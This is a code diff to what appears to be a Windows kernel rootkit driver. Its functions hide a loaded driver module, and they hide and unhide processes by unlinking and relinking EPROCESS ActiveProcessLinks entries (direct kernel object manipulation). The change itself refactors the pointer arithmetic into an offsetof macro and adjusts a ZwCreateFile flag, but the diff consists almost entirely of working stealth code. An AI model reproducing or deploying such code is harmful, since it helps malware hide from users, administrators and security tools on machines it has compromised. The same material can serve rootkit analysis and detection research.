@@ -1,5 +1,7 @@
 #include "DKOM.h"
 #include "ProcessGlobals.h"
+#define offsetof(st, m) \
+    ((SIZE_T)&(((st *)0)->m))
 
 
 NTSTATUS kernelobjs_hiding::HideSystemModule(DRIVER_OBJECT* DriverObject, PUNICODE_STRING DriverName) {
@@ -16,7 +18,7 @@ NTSTATUS kernelobjs_hiding::HideSystemModule(DRIVER_OBJECT* DriverObject, PUNICO
 	// DriverObject = NULL - object is not provided, need to find it by name: 
 	if (DriverObject == NULL) {
 		InitializeObjectAttributes(&DriverAttr, DriverName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
-		if (!NT_SUCCESS(ZwCreateFile(&DriverHandle, OBJ_CASE_INSENSITIVE, &DriverAttr, &DriverStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0)) || DriverHandle == NULL) {
+		if (!NT_SUCCESS(ZwCreateFile(&DriverHandle, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, &DriverAttr, &DriverStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0)) || DriverHandle == NULL) {
 			DbgPrintEx(0, 0, "KMDFdriver process - HideSystemModule(), Could not get handle for driver %wZ\n", DriverName);
 			return STATUS_UNSUCCESSFUL;
 		}
@@ -58,7 +60,7 @@ NTSTATUS process::DKHideProcess(ULONG64 ProcessId, BOOL IsStrict) {
 	CurrentProcess = (PACTEPROCESS)PsInitialSystemProcess;
 	PreviousList = &CurrentProcess->ActiveProcessLinks;
 	CurrentList = PreviousList->Flink;
-	CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - ((ULONG64)&CurrentProcess->ActiveProcessLinks - (ULONG64)CurrentProcess));
+	CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - offsetof(struct _ACTEPROCESS, ActiveProcessLinks));
 	NextList = CurrentList->Flink;
 
 	while (CurrentList != LastProcessFlink) {
@@ -74,7 +76,7 @@ NTSTATUS process::DKHideProcess(ULONG64 ProcessId, BOOL IsStrict) {
 		PreviousList = CurrentList;
 		CurrentList = NextList;
 		NextList = CurrentList->Flink;
-		CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - ((ULONG64)&CurrentProcess->ActiveProcessLinks - (ULONG64)CurrentProcess));
+		CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - offsetof(struct _ACTEPROCESS, ActiveProcessLinks));
 	}
 	DbgPrintEx(0, 0, "KMDFdriver process - HideProcess(DKOM), Did not find process to hide (%llu)\n", ProcessId);
 	if (IsStrict) {
@@ -112,12 +114,12 @@ NTSTATUS process::DKUnhideProcess(ULONG64 ProcessId, ULONG HiddenIndex) {
 	CurrentProcess = (PACTEPROCESS)PsInitialSystemProcess;
 	PreviousList = &CurrentProcess->ActiveProcessLinks;
 	CurrentList = PreviousList->Flink;
-	CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - ((ULONG64)&CurrentProcess->ActiveProcessLinks - (ULONG64)CurrentProcess));
+	CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - offsetof(struct _ACTEPROCESS, ActiveProcessLinks));
 	NextList = CurrentList->Flink;
 
 	while (CurrentList != LastProcessFlink) {
 		if ((ULONG64)CurrentProcess->UniqueProcessId > (ULONG64)UnhiddenProcess->UniqueProcessId) {
-			PreviousProcess = (PACTEPROCESS)((ULONG64)PreviousList - ((ULONG64)&CurrentProcess->ActiveProcessLinks - (ULONG64)CurrentProcess));
+			PreviousProcess = (PACTEPROCESS)((ULONG64)PreviousList - offsetof(struct _ACTEPROCESS, ActiveProcessLinks));
 			(&UnhiddenProcess->ActiveProcessLinks)->Flink = CurrentList;
 			PreviousList->Flink = &UnhiddenProcess->ActiveProcessLinks;
 			(&UnhiddenProcess->ActiveProcessLinks)->Blink = PreviousList;
@@ -128,7 +130,7 @@ NTSTATUS process::DKUnhideProcess(ULONG64 ProcessId, ULONG HiddenIndex) {
 		PreviousList = CurrentList;
 		CurrentList = NextList;
 		NextList = CurrentList->Flink;
-		CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - ((ULONG64)&CurrentProcess->ActiveProcessLinks - (ULONG64)CurrentProcess));
+		CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - offsetof(struct _ACTEPROCESS, ActiveProcessLinks));
 	}
 	DbgPrintEx(0, 0, "KMDFdriver process - UnhideProcess(DKOM), Did not find place to hide process %llu\n", (ULONG64)UnhiddenProcess->UniqueProcessId);
 	return STATUS_NOT_FOUND;
